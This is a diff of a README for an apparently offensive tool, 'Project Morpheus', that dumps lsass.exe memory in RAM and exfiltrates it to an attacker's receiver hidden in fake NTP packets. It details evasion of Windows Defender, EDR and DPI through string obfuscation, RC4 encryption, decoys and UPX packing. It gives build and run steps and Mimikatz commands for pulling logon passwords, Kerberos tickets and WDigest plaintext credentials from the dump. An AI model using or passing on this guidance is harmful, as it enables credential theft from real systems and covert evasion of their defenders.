@@ -1,194 +1,146 @@
-
-<h1 align="center"> Project Morpheus </h1>
+<h1 align="center">Project Morpheus</h1>
 
 ## Overview
 
-Morpheus is a covert tool designed to dump the memory of the Windows process "lsass.exe" and exfiltrate it using stealthy network techniques. Unlike traditional tools such as Mimikatz, Morpheus performs all operations entirely in RAM—minimizing disk artifacts—and leverages advanced network obfuscation methods to evade detection by Windows Defender, EDR, and forensic tools.
+**Morpheus** is a fully in-RAM Windows memory-dump & exfiltration framework for **`lsass.exe`**, designed to leave zero disk artifacts and blend seamlessly into legitimate NTP network traffic. Unlike tools such as Mimikatz or procdump, Morpheus:
 
-The project consists of:
-- A dumper (`morpheus.c`) that extracts the target process's memory (`lsass.exe`) using Windows debugging APIs.
-- A sender that compresses, fragments, and then exfiltrates the memory dump over UDP using packets disguised as legitimate NTP requests.
-- A receiver (`server.py`) that reassembles the fragments, decompresses the dump, and writes it to a file for further analysis.
+- Uses **indirect syscalls** (via dynamically loaded Advapi32) to enable **SeDebugPrivilege** without on-disk stubs.
+- Dumps process memory via **`MiniDumpWriteDump`** from **`DbgHelp.dll`**, into a temporary in-RAM buffer.
+- Compresses the dump with **zlib** (in-memory), reducing size and obfuscating entropy.
+- Fragments and **RC4-encrypts** the compressed data, adding per‑packet “skip” offsets derived from the sequence number.
+- Implements **Reed–Solomon FEC** over GF(256) (primitive polynomial 0x11d) with a Vandermonde generator to recover lost fragments.
+- Exfiltrates everything over UDP port 123 as **legitimate NTP requests**, with randomized header fields and decoy traffic to defeat DPI.
 
-## Features
+---
 
-### Process Identification & Obfuscation
+## Components
 
-- **Obfuscated Target:**
-  The target process name ("lsass.exe") is obfuscated in the source code using XOR encoding (with key 0x13) to avoid static signature detection.
-- **Dynamic Enumeration:**
-  The tool uses Windows APIs (e.g., `CreateToolhelp32Snapshot`) to enumerate running processes, dynamically locating the target's PID at runtime.
+1. **Dumper** (`morpheus.c` / `memdump.exe`):  
+   - **Privilege elevation** via indirect `OpenProcessToken`/`LookupPrivilegeValueW`/`AdjustTokenPrivileges`.  
+   - **Target obfuscation**: `"lsass.exe"` is XOR’d bytewise (key 0x13) in the binary, decoded at runtime.  
+   - **Process enumeration** with `CreateToolhelp32Snapshot` + `Process32FirstW`/`NextW`.  
+   - **In-RAM dump**: calls `MiniDumpWriteDump` → reads the temporary dump file back into memory.  
+   - **Compression**: zlib’s `compress()` → `compressedBuffer`.  
+   - **Fragmentation**: split into `FRAGMENT_SIZE`-byte chunks (default 2 bytes each).  
+   - **RC4 encryption**: per-packet KSA + PRGA, with a **skip** of `(seq*7)%256` for data packets, `(seq*13)%256` for FEC.  
+   - **RFEC**: for each block of `BLOCK_SIZE` fragments, generate parity shards.  
+   - **Decoys**: 1/5 chance per data packet to send a pure NTP decoy (timestamp+fraction only).  
+   - **Inter‑packet jitter**: `Sleep(rand(BASE_DELAY_MIN…BASE_DELAY_MAX))` ms (e.g. 5–20 ms) → high throughput but randomized.  
+   - **NTP header randomization** on each burst:  
+     - **Stratum** ∈ [2…4]  
+     - **Poll** ∈ [6…10]  
+     - **Precision** ∈ [–10…–20]  
+     - **Reference ID**: zero or random (1 in 10)  
 
-### Memory Dumping & Compression
+2. **Python Receiver** (`server.py`):  
+   - Listens on UDP port 123 (NTP).  
+   - Extracts the 8-byte **Transmit Timestamp** from each 48-byte packet.  
+   - **Deduce “skip”** by trying 0…255 until decrypted high‑word < `total_fragments` (data) or ≥ (FEC).  
+   - Stores data fragments (`seq → 2 bytes`) and FEC shards (`(block, idx) → 2 bytes`).  
+   - **Gauss over GF(256)** to recover missing in each block (pos 0 & pos 1 separately).  
+   - Reassembles and **zlib.decompress()** → writes `dump_memory.bin`.  
+   - Sends UDP feedback on port 124 listing any remaining missing sequences.
 
-- **In-Memory Dumping:**
-  Morpheus leverages the `MiniDumpWriteDump` function from `DbgHelp.dll` to dump the target's memory directly into RAM, avoiding any disk writes.
-- **In-Memory Compression:**
-  The memory dump is compressed using zlib. This not only reduces the total amount of data that needs to be exfiltrated but also helps disguise the data by reducing its signature.
+3. **PowerShell Receiver** (`server.ps1`):  
+   - Identical logic in PowerShell 7+.  
+   - Uses `.NET` GF(256) tables, RC4, RS decode, zlib via `ZLibStream`/`DeflateStream`.  
+   - `BASE_TIMEOUT = 432000` seconds (5 days) to cover ~4‑5 day exfiltration.
 
-### Covert Exfiltration via Fake NTP Packets
+---
 
-- **NTP Packet Camouflage:**
-  The compressed dump is fragmented into small chunks (each fragment carrying 2 bytes of useful data) and transmitted via UDP packets that mimic NTP requests.
-- **Data Embedding:**
-  Each 48-byte NTP packet is manipulated to embed covert data in the "Transmit Timestamp" field:
-  - **Header Packet:**
-    The very first packet is unencrypted and includes:
-      - 4 bytes: Total number of fragments (big-endian)
-      - 4 bytes: Total compressed dump size (big-endian)
-  - **Data Packets:**
-    Subsequent packets carry:
-      - 4 bytes: Fragment sequence number (encrypted with RC4)
-      - 4 bytes: Data fragment (encrypted with RC4)
-- **RC4 Encryption:**
-  Every payload (both data and parity) is encrypted with a simple RC4 stream cipher using a predefined key. Additionally, a variable "skip" value is computed based on the sequence number to add further randomness to the keystream, ensuring that even if packets are intercepted, the hidden data remains obfuscated.
+## How NTP Camouflage Works
 
-### Enhanced Reliability with RFEC & Retransmission
-
-- **RFEC Using Reed-Solomon Coding:**
-  Morpheus implements advanced Reed Forward Error Correction (RFEC) techniques by using the Reed-Solomon algorithm. The algorithm operates over GF(256) (Galois Field 256) using precomputed logarithm and exponentiation tables, based on the primitive polynomial 0x11d.
-  - A Vandermonde matrix is used to generate the parity symbols. For every block of data fragments (with a block size defined by a configurable parameter), an equal number of parity fragments is computed.
-  - These parity fragments, often referred to as RFEC or Reed-Solomon coding packets, allow the receiver to recover any missing data fragments even in the presence of packet loss.
-- **Feedback-Based Retransmission:**
-  A feedback mechanism over UDP is implemented to detect missing fragments. The sender listens on port 123 for feedback packets that specify the sequence numbers of fragments that were not successfully received, and then retransmits those fragments. This process repeats up to a configurable maximum number of retransmission cycles.
-- **Randomized Transmission & Decoy Packets:**
-  To further obfuscate exfiltration, the order of fragment transmission is randomized. Additionally, decoy NTP packets are sent intermittently to blend with legitimate traffic and mislead network monitoring systems.
-
-## How NTP Packet Camouflage Works
-
-### Standard NTP Packet Structure
-
-A standard NTP packet is 48 bytes long with the last 8 bytes dedicated to the Transmit Timestamp. Morpheus repurposes this field for covert data transmission:
-
-```
-      0                   1                   2                   3
-      0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
-     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-     |LI | VN  |Mode |    Stratum     |     Poll      |  Precision   |
-     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-     |                          Root Delay                           |
-     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-     |                       Root Dispersion                         |
-     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-     |                     Reference Identifier                      |
-     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-     |                                                               |
-     |                   Reference Timestamp (64 bits)               |
-     |                                                               |
-     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-     |                                                               |
-     |                   Originate Timestamp (64 bits)               |
-     |                                                               |
-     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-     |                                                               |
-     |                    Receive Timestamp (64 bits)                |
-     |                                                               |
-     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-     |                                                               |
-     |                    Transmit Timestamp (64 bits)               |
-     |                                                               |
-     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+```text
+   0                   1                   2                   3
+   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+  |LI | VN  |Mode |    Stratum     |     Poll      |  Precision   |
+  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+  |                          Root Delay                           |
+  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+  |                       Root Dispersion                         |
+  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+  |                     Reference Identifier                      |
+  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+  |                   Reference Timestamp (64 bits)               |
+  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+  |                   Originate Timestamp (64 bits)               |
+  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+  |                    Receive Timestamp (64 bits)                |
+  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+  |                    Transmit Timestamp (64 bits)               |
+  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 ```
 
-### Data Embedding Details
+- **Bytes 0–3**: LI=0, VN=3, Mode=3; Stratum/Poll/Precision randomized.  
+- **Bytes 4–39**: padding/noise.  
+- **Bytes 40–47**: covert payload (header, data, or FEC).
 
-- **Header Packet:**
-  - 4 bytes: Total number of fragments
-  - 4 bytes: Total compressed dump size
-- **Data Packets:**
-  - 4 bytes: Fragment sequence number (encrypted with RC4)
-  - 4 bytes: Data fragment (encrypted with RC4)
-- **RFEC (Reed-Solomon) Packets:**
-  For each block of data fragments, an equal number of parity fragments is generated using the Reed-Solomon algorithm. These packets are marked with a special high-order bit in the sequence number to denote RFEC data.
+---
 
-## Installation & Compilation
+## Installation & Build
 
-### Windows (PowerShell)
+### PowerShell bootstrap
 
-If you are using Visual Studio Code or another configured development environment:
-1. Open a PowerShell window and run:
-   ```powershell
-   Set-ExecutionPolicy Bypass -Scope Process -Force; ./run.ps1
-   ```
-   This script compiles `memdump.c` while linking against the necessary libraries (`ws2_32.lib` and `DbgHelp.lib`).
+```powershell
+Set-ExecutionPolicy Bypass -Scope Process -Force
+./run.ps1
+```
+
+### Compile Dumper
+
+```powershell
+gcc -I"C:
+cpkg\installedd-mingw-static\include" `
+    -L"C:
+cpkg\installedd-mingw-static\lib" `
+    -static -o memdump.exe morpheus.c -lzlib -lws2_32 -lDbgHelp
+upx --best memdump.exe
+```
+
+### Python Receiver
+
+```bash
+chmod +x server.py
+```
+
+### PowerShell Receiver
+
+```powershell
+.\server.ps1
+```
+
+---
 
 ## Usage
 
-1. **Run the Dumper (Attacker)**
-
-   On Windows, run:
-   ```powershell
-   .\memdump.exe
-   ```
-   You will be prompted to enter the receiver’s IP address and port for exfiltration.
-
-   **Important:** The executable must be run with SYSTEM privileges to properly access `lsass.exe`'s memory.
-
-2. **Run the Receiver (Listener)**
-
-   On the attacker's machine, run:
-   ```bash
-   python3 server.py
-   ```
-   The Python receiver listens on UDP port 123 (NTP), reassembles the incoming fragments, decompresses the memory dump, and saves it as a file (typically named `dump_memory.bin`).
-
-## Example Execution
-
-### Attacker (Dumper)
-
-```plaintext
-[*] Enter receiver IP: 192.168.1.100
-[*] Enter receiver port: 123
-[+] Decoded target process: lsass.exe
-[+] Process lsass.exe found with PID 1234
-[+] Memory dump completed. Size: 16 MB.
-[+] Compression completed. Compressed size: 512 KB.
-[+] Header sent: 128 fragments, 512 KB total.
-[+] Data packet for fragment 1/128 sent.
-...
-[+] Transmission completed.
+```powershell
+# Dumper
+.\memdump.exe
 ```
 
-### Receiver (Listener)
-
-```plaintext
-[INFO] Listening on 0.0.0.0:123 (global timeout: 30s)
-[INFO] Header received: 128 fragments, 512 KB compressed size.
-[INFO] Receiving packets...
-[Reconstitution] [========------] 50% (64/128)
-[INFO] All fragments received.
-[INFO] Decompressing...
-[INFO] Dump saved as dump_memory.bin.
+```bash
+# Python Receiver
+./server.py
 ```
 
-## Analyzing the Dump with Mimikatz
+```powershell
+# PS Receiver
+.\server.ps1
+```
 
-Once `dump_memory.bin` is obtained, use Mimikatz to extract sensitive information:
+---
 
-- **Download Mimikatz:**
-  Get the latest version from the official GitHub repository: [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
+## Post-Processing with Mimikatz
 
-- **Run Mimikatz:**
-  Open a command prompt with administrative privileges and navigate to the Mimikatz directory.
+```powershell
+sekurlsa::minidump dump_memory.bin
+sekurlsa::logonpasswords
+```
 
-- **Load and Analyze the Memory Dump:**
-  ```shell
-  mimikatz # sekurlsa::minidump dump_memory.bin
-  mimikatz # sekurlsa::logonpasswords
-  ```
-  The first command loads the memory dump.
-
-  The second command extracts and displays logon credentials.
-
-- **Extract Additional Information:**
-  ```shell
-  mimikatz # sekurlsa::tickets
-  mimikatz # sekurlsa::wdigest
-  ```
-  `sekurlsa::tickets` extracts Kerberos tickets.
-
-  `sekurlsa::wdigest` retrieves plaintext credentials stored by WDigest.
+---
 
 ## Legal Notice
 
-This tool is for EDUCATIONAL and AUTHORIZED TESTING ONLY. Use it only on systems you own or for which you have explicit permission to test. Unauthorized use is illegal and unethical.
+**FOR AUTHORIZED TESTING ONLY.**  
+Unauthorized use is illegal and unethical.
